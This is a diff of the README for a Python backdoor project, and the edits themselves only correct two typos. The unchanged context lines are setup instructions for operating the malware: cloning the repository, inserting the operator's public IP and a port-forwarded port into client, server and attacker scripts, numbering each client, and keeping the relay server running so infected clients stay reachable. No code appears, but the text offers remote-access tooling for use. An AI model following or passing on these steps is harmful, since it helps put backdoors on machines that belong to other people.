@@ -3,11 +3,11 @@
 **Installation**
 - Install with ``` git clone https://github.com/3BixxPy/PythonBackdoor.git ```
 - If you dont have git just install to a folder
-- Read all thats below
+- Read all that's below
 
 **Setup**
 - Replace "IP" with your public IP in client.py and attacker.py **dont replace in server.py**
-- Replace "CLIENTNUMBER" in client.py with any number that you havent used yet.
+- Replace "CLIENTNUMBER" in client.py with any number that you haven't used yet.
   - always set a different CLIENTNUMBER to every new client you intend to use
 - Replace "PORT" in server.py, client.py and attacker.py with your port forwarded port, [Tutorial](https://www.youtube.com/watch?v=0F53xFGhT-c) on how to port forward
 - Run server.py, it has to be always up or client wont be able to comunicate with the attacker
